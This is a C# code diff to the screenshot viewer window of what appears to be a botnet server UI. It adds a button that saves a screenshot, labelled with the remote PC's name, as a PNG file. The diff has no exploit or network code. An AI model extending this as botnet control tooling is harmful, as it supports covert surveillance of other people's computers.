@@ -2,6 +2,8 @@
 // (or by any other means, with saving authorship by Zerumi and PizhikCoder retained)
 using System;
 using System.Collections.Generic;
+using System.Drawing;
+using System.Drawing.Imaging;
 using System.IO;
 using System.Linq;
 using System.Text;
@@ -22,10 +24,12 @@ namespace BotNet_Server_UI
     /// </summary>
     public partial class ScreenBox : Window
     {
+        string nameofpc;
         public int screenid = 0;
         ScreenByte[] screenBytes { get; set; }
-        public ScreenBox(ScreenByte[] screenBytes)
+        public ScreenBox(ScreenByte[] screenBytes, string nameofpc)
         {
+            this.nameofpc = nameofpc;
             this.screenBytes = screenBytes;
             InitializeComponent();
             var image = LoadImage(screenBytes[screenid].bytes);
@@ -67,6 +71,27 @@ namespace BotNet_Server_UI
                 return;
             }
             Image.Source = LoadImage(screenBytes[screenid].bytes);
+        }
+
+        private void DownloadButton_Click(object sender, RoutedEventArgs e)
+        {
+        linkcreatepng:
+            try
+            {
+                var encoder = new PngBitmapEncoder();
+                encoder.Frames.Add(BitmapFrame.Create((BitmapSource)Image.Source));
+                using (FileStream stream = new FileStream($"{Directory.GetCurrentDirectory()}\\Screens\\{new Random().Next()}-Screen-{nameofpc}-{screenBytes[screenid].sid}.png", FileMode.Create))
+                    encoder.Save(stream);
+            }
+            catch (DirectoryNotFoundException)
+            {
+                Directory.CreateDirectory($"{Directory.GetCurrentDirectory()}\\Screens");
+                goto linkcreatepng;
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.ToString());
+            }
         }
     }
 }
